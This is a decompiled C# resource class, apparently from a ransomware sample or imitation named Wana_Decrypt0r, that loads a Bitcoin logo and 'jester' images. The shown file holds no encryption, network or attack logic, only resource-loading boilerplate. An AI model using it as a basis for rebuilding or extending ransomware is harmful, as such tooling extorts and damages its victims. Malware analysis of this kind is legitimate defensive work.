using System;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;

namespace Wana_Decrypt0r.Properties
{
	// Token: 0x02000005 RID: 5
	[DebuggerNonUserCode]
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
	[CompilerGenerated]
	internal class Resources
	{
		// Token: 0x0600001F RID: 31 RVA: 0x00003CB8 File Offset: 0x00001EB8
		internal Resources()
		{
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003CCC File Offset: 0x00001ECC
		internal static ResourceManager smethod_0()
		{
			if (Resources.resourceManager_0 == null)
			{
				Resources.resourceManager_0 = new ResourceManager("Wana_Decrypt0r.Properties.Resources", typeof(Resources).Assembly);
			}
			return Resources.resourceManager_0;
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003D04 File Offset: 0x00001F04
		internal static CultureInfo smethod_1()
		{
			return Resources.cultureInfo_0;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00003D18 File Offset: 0x00001F18
		internal static void smethod_2(CultureInfo cultureInfo_1)
		{
			Resources.cultureInfo_0 = cultureInfo_1;
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00003D2C File Offset: 0x00001F2C
		internal static Bitmap smethod_3()
		{
			return (Bitmap)Resources.smethod_0().GetObject("1416948020_bitlogo", Resources.cultureInfo_0);
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00003D54 File Offset: 0x00001F54
		internal static Bitmap smethod_4()
		{
			return (Bitmap)Resources.smethod_0().GetObject("2000px-Bitcoin_logo.svg", Resources.cultureInfo_0);
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00003D7C File Offset: 0x00001F7C
		internal static Bitmap smethod_5()
		{
			return (Bitmap)Resources.smethod_0().GetObject("jester", Resources.cultureInfo_0);
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00003DA4 File Offset: 0x00001FA4
		internal static Bitmap smethod_6()
		{
			return (Bitmap)Resources.smethod_0().GetObject("jester1", Resources.cultureInfo_0);
		}

		// Token: 0x0400002B RID: 43
		private static ResourceManager resourceManager_0;

		// Token: 0x0400002C RID: 44
		private static CultureInfo cultureInfo_0;
	}
}
